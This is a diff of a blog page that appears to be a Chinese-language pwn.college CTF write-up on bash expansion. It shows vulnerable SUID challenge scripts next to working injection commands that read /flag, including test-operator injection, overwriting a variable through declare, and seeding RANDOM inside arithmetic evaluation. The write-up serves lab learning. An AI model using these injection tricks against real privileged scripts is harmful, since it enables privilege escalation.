@@ -30,7 +30,7 @@
 <meta property="og:description" content="The shell is as mysterious as it is powerful. As a first stop in our journey, we will explore concepts of variable expansion, the pitfalls around quoting (and lack thereof!), and the raw power of glo">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-04-01T03:37:52.000Z">
-<meta property="article:modified_time" content="2026-09-08T14:40:47.298Z">
+<meta property="article:modified_time" content="2026-09-15T02:01:40.112Z">
 <meta property="article:author" content="vkkkv">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="pwncollege">
@@ -235,18 +235,18 @@ Similarity</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" h
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">409</span>
+          <span class="site-state-item-count">532</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">265</span>
+        <span class="site-state-item-count">348</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -319,7 +319,7 @@ Similarity</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" h
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-08 22:40:47" itemprop="dateModified" datetime="2026-09-08T22:40:47+08:00">2026-09-08</time>
+      <time title="Modified: 2026-09-15 10:01:40" itemprop="dateModified" datetime="2026-09-15T10:01:40+08:00">2026-09-15</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -401,7 +401,7 @@ Similarity</h2>
 <p>word splitting</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@expansion~saga-of-the-sneaky-similarity:~$ <span class="built_in">cat</span> /challenge/run</span><br><span class="line"><span class="comment">#!/usr/bin/exec-suid --real --environ=none -- /bin/bash -p</span></span><br><span class="line"></span><br><span class="line">PATH=/usr/bin</span><br><span class="line">CHALLENGE=$RANDOM$RANDOM<span class="variable">$RANDOM</span></span><br><span class="line"></span><br><span class="line">[ -n <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ] || <span class="built_in">exit</span> 1</span><br><span class="line">[ <span class="variable">$1</span> -eq <span class="string">&quot;<span class="variable">$CHALLENGE</span>&quot;</span> ] &amp;&amp; <span class="built_in">cat</span> /flag</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Goodbye!&quot;</span></span><br><span class="line">ubuntu@expansion~saga-of-the-sneaky-similarity:~$ /challenge/run <span class="string">&quot;1 -eq 1 -o 1&quot;</span></span><br><span class="line">pwn.college&#123;****************************************&#125;</span><br><span class="line">Goodbye!</span><br></pre></td></tr></table></figure>
 <h2 id="enigma-of-the-environment">Enigma of the Environment</h2>
-<p>declare 是用来声明或修改变量的。脚本的本意是让你通过 $1 和 $2
+<p>declare 是用来声明或修改变量的。脚本的本意是通过 $1 和 $2
 设置一个临时的环境变量，接着运行 $PROGRAM（在前面被硬编码成了
 $WORKDIR/fortune）</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/exec-suid --real --environ=none -- /bin/bash -p</span></span><br><span class="line"></span><br><span class="line">PATH=/usr/bin</span><br><span class="line">WORKDIR=$(<span class="built_in">mktemp</span> -d) || <span class="built_in">exit</span> 1</span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$WORKDIR</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Welcome! This is a launcher that lets you set an environment variable and then run a program!\nUsage: <span class="variable">$0</span> VARNAME VARVALUE PROGRAM&quot;</span></span><br><span class="line">[ <span class="string">&quot;<span class="variable">$#</span>&quot;</span> -eq 3 ] || <span class="built_in">exit</span> 2</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$3</span>&quot;</span> != <span class="string">&quot;fortune&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Only &#x27;fortune&#x27; is supported right now!&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        <span class="built_in">cp</span> /usr/games/fortune <span class="variable">$WORKDIR</span></span><br><span class="line">        PROGRAM=<span class="string">&quot;<span class="variable">$WORKDIR</span>/fortune&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">declare</span> -- <span class="string">&quot;<span class="variable">$1</span>&quot;</span>=<span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line"><span class="variable">$PROGRAM</span></span><br><span class="line">ubuntu@expansion~enigma-of-the-environment:~$ /challenge/run PROGRAM <span class="string">&quot;/bin/cat /flag&quot;</span> fortune</span><br><span class="line">Welcome! This is a launcher that lets you <span class="built_in">set</span> an environment variable and <span class="keyword">then</span> run a program!</span><br><span class="line">Usage: /challenge/run VARNAME VARVALUE PROGRAM</span><br><span class="line">pwn.college&#123;****************************************&#125;</span><br></pre></td></tr></table></figure>
@@ -467,9 +467,9 @@ script 执行</p>
 <p>Bash 的 <code>printf</code> 命令有一个选项：<code>-v var</code>。</p>
 <p>它的作用是：<strong>不把格式化结果输出到标准输出
 (stdout)，而是直接将结果赋值给名为 <code>var</code> 的变量</strong></p>
-<p>要完成利用，我们需要借助 Bash
-处理命令行的固定顺序：<strong>先变量展开 (Expansion) -&gt; 再处理重定向
-(Redirection) -&gt; 最后执行命令 (Execution)</strong>。</p>
+<p>要完成利用，需要借助 Bash 处理命令行的固定顺序：<strong>先变量展开
+(Expansion) -&gt; 再处理重定向 (Redirection) -&gt; 最后执行命令
+(Execution)</strong>。</p>
 <p>假设向这个 SUID
 脚本传入这样的参数：<code>"-v GUESSFILE /flag"</code>。</p>
 <p>脚本执行到 <code>printf $1 &gt; $GUESSFILE</code> 时，<code>$1</code>
@@ -500,17 +500,17 @@ stdout 输出。相反，它<strong>将当前 Shell 进程中的
 禁用所有 Subshell</p>
 <p><code>$()</code> 在 Bash 术语中被称为 <strong>Command Substitution
 (命令替换)</strong>。</p>
-<p>从操作系统层面来看，每当你使用 <code>$()</code>，Bash
+<p>从操作系统层面来看，每当使用 <code>$()</code>，Bash
 都会隐式地调用底层的 <code>fork()</code>
-系统调用，复制出一个全新的子进程环境——这就是我们常说的 <strong>Subshell
-(子 Shell)</strong>。</p>
+系统调用，复制出一个全新的子进程环境，即 <strong>Subshell (子
+Shell)</strong>。</p>
 <p>既然存在 Subshell，Bash 就需要一种机制来知道自己当前处于第几层</p>
 <p><code>$BASH_SUBSHELL</code>
 就是这样一个内置的（builtin）只读变量：</p>
 <ul>
 <li>在最顶层的父 Shell 中，它的值是 <code>0</code>。</li>
-<li>当你进入第一层 <code>$()</code> 时，它自增变成 <code>1</code>。</li>
-<li>如果你在 <code>$()</code> 里再套一个 <code>$()</code>，它就变成
+<li>进入第一层 <code>$()</code> 时，该值自增为 <code>1</code>。</li>
+<li>在 <code>$()</code> 里再嵌套一层 <code>$()</code> 时，该值变为
 <code>2</code>，以此类推。</li>
 </ul>
 <p><code>trap</code> 命令是用来捕捉系统信号（Signals）的。但挂载在
@@ -539,7 +539,7 @@ Subshell。此时 <code>$BASH_SUBSHELL</code> 的值变为
 <li>在 <code>cat /flag</code> 执行前，<code>trap</code> 被触发。</li>
 <li>Subshell 开始执行 trap
 代码：<code>[[ $BASH_SUBSHELL -gt 0 ]]</code>。</li>
-<li>系统一查，当前层级是 1，<code>1 &gt; 0</code> 成立！</li>
+<li>系统检查到当前层级为 1，<code>1 &gt; 0</code> 成立。</li>
 <li>执行 <code>&amp;&amp;</code> 后面的 <code>exit</code>。</li>
 </ol>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(( ... )) 的上下文中，Bash 允许动态的变量赋值</span><br><span class="line"></span><br><span class="line">Bash 在执行 (( PATH=0 == CHALLENGE )) 时，会将环境变量 PATH 修改为字符串 &quot;0&quot;。</span><br><span class="line"></span><br><span class="line">赋值表达式 PATH=0 返回 0，而 0 == CHALLENGE 显然为 false（因为 $RANDOM 串大概率不是 0）。</span><br><span class="line"></span><br><span class="line">脚本走进 else 分支。</span><br><span class="line"></span><br><span class="line">接下来它要执行 cat 和 md5sum。此时 PATH 变成了 0。在 Linux 路径解析法则中，没有任何前缀的 0 指代的是相对于当前目录的一个名为 0 的文件夹 (即 ./0/)。</span><br><span class="line"></span><br><span class="line">Bash 会去 ./0/cat 和 ./0/md5sum 寻找这两个二进制程序</span><br></pre></td></tr></table></figure>
@@ -547,14 +547,13 @@ Subshell。此时 <code>$BASH_SUBSHELL</code> 的值变为
 <h2 id="the-swap-scheming">The Swap, Scheming</h2>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@expansion~the-swap-scheming:~$ <span class="built_in">cat</span> /challenge/run</span><br><span class="line"><span class="comment">#!/usr/bin/exec-suid --real --environ=none -- /bin/bash -p</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># props to HyperCube for the idea for this challenge</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># HINT: This challenge uses /bin/bash. Double-check which bash you do your prep work in...</span></span><br><span class="line"></span><br><span class="line">PATH=/usr/bin</span><br><span class="line">RESPONSE=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/null <span class="comment"># props to amateurhour for this unintended solve</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This disables command injection. If you can find a bypass of it, let Zardus know!</span></span><br><span class="line"><span class="built_in">set</span> -T</span><br><span class="line"><span class="built_in">readonly</span> BASH_SUBSHELL <span class="comment"># props to HAL50000 for the bypass necessitating this fix</span></span><br><span class="line"><span class="built_in">trap</span> <span class="string">&#x27;[[ $BASH_SUBSHELL -gt 0 ]] &amp;&amp; exit&#x27;</span> DEBUG</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (( RESPONSE == RANDOM ))</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Success!&quot;</span></span><br><span class="line">    <span class="built_in">cat</span> /flag</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Wrong!&quot;</span></span><br><span class="line">    <span class="built_in">rm</span> /flag</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
 <p>在 Bash 中，RANDOM 并不是真正的随机，它是一个 PRNG
-(伪随机数生成器)。如果你尝试给 RANDOM
-赋值，你实际上是在设置它的随机数种子
-(Seed)！只要种子固定，接下来生成的随机数序列就是 100%
+(伪随机数生成器)。给 RANDOM 赋值实际上是在设置它的随机数种子
+(Seed)。只要种子固定，接下来生成的随机数序列就是 100%
 确定的。而且，不同的 Bash 版本（比如 Bash 4.x 和
-5.x）用同一个种子生成的第一个随机数可能会不同，这就是为什么提示让你在
-/bin/bash 里做准备。</p>
-<p>在 Bash 的算术求值 (( ... )) 中，我们可以使用逗号表达式 (Comma
-Operator)。逗号表达式会按顺序执行各个部分，并以最后一个表达式的结果作为最终的真假值。</p>
+5.x）用同一个种子生成的第一个随机数可能会不同，这正是提示要求在
+/bin/bash 中做准备的原因。</p>
+<p>在 Bash 的算术求值 (( ... )) 中，可以使用逗号表达式 (Comma
+Operator)。逗号表达式按顺序执行各个部分，并以最后一个表达式的结果作为最终的真假值。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@expansion~the-swap-scheming:~$ /challenge/run <span class="string">&quot;RANDOM=0, <span class="subst">$(bash -c &#x27;RANDOM=0; echo $RANDOM&#x27;)</span>&quot;</span></span><br><span class="line">Success!</span><br><span class="line">pwn.college&#123;****************************************&#125;</span><br></pre></td></tr></table></figure>
 <h2 id="shell-sorcery">Shell Sorcery</h2>
 <p>arithmetic evaluation</p>
